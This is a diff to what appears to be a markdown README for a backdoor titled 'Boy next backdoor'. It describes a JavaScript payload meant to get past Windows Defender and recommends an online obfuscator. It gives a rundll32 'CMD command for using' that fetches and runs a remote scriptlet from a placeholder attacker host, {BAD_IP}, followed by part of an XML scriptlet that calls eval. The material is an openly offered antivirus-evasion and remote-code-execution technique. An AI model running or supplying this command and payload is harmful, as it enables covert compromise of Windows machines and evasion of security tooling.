@@ -1,10 +1,17 @@
+# Boy next backdoor
+
 JS payload + bypass windows defender
+
 Obfuscator: https://codebeautify.org/javascript-obfuscator
-CMD command: rundll32.exe javascript:"\..\..\..\mshtml, RunHTMLApplication ";document.write();GetObject("script"+":"+"http://{BAD_IP}/JSpayload.tmp")
-Original: http://hyp3rlinx.altervista.org/advisories/MICROSOFT_WINDOWS_DEFENDER_DETECTION_BYPASS.txt
+
+CMD command for using: 
+```cmd
+rundll32.exe javascript:"\..\..\..\mshtml, RunHTMLApplication ";document.write();GetObject("script"+":"+"http://{BAD_IP}/JSpayload.tmp")
+```
 
 {PAYLOAD BEFORE OBFUSCATION}
 
+```xml
 <?xml version="1.0"?>
 <component>
 <script>
@@ -21,3 +28,6 @@ eval(str)
 ]]>
 </script>
 </component>
+```
+
+Original: http://hyp3rlinx.altervista.org/advisories/MICROSOFT_WINDOWS_DEFENDER_DETECTION_BYPASS.txt
